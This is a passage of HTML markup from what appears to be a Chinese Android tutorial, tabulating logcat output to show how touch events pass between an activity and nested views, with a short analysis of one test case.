+<td style="text-align: center;" colspan="5">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Text</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;05-10 03:41:19.743 </span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">cn.sunzn.tevent&nbsp; </span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_DOWN<br /></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;E</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">sunzn</span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_DOWN</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;<span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">414</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">E</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;<span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">414</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">sunzn</span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_MOVE</span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;<span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">414</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">E</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;<span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">414</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">sunzn</span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_MOVE</span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;<span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">414</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">E</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;<span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">414</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">sunzn</span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp; TouchEventFather | dispatchTouchEvent --&gt; ACTION_MOVE</span></span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">sunzn</span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_UP</span></span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">E</span></span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;05-10 03:41:19.743</span></span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif;">&nbsp;414</span></span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;cn.sunzn.tevent</span></span></span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">sunzn</span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; <span style="color: #ff0000;">TouchEventFather | dispatchTouchEvent --&gt; ACTION_UP</span></span></span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #000000;">结果分析</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">代码运行后，事件首先由 TouchEventActivity 的 dispatchTouchEvent 方法分发给 TouchEventFather 控件的 </span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent，而该控件的 dispatchTouchEvent 返回 true，表示分发事件到&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather 控件</span>并由该控件的 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent 进行消费；<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity 不断的分发事件到 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather 控件的 </span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent，而 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather 控件的</span></span></span></span> <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent</span></span></span></span> 也不断的将获取到的事件进行消费。</span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tbody>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</table>
+<p>&nbsp;<strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Case 3 </span></strong></p>
+<table style="border: 0px solid #79787d; width: 980px; background-color: #e4e5e6;" border="0">
+<tbody>
+<tr>
+<td style="text-align: center;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">拦截条件</span></strong></span></strong></span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">控件名称 </span></strong></td>
+<td style="text-align: center;" colspan="3"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;" colspan="4"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onTouchEvent 返回值</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity</span></span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev) </span></span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">--- </span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev)</span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">true</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev)</span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onInterceptTouchEvent(ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">运行结果</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Level</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Time</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">PID</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Application</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Tag</span></span></span></span></span></span></td>
+<td style="text-align: center;" colspan="5">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Text</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">05-10 05:34:46.333</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">481</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; TouchEventActivity | dispatchTouchEvent --&gt; ACTION_DOWN</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="color: #ff0000; font-family: arial,helvetica,sans-serif; font-size: 13px;">E</span></td>
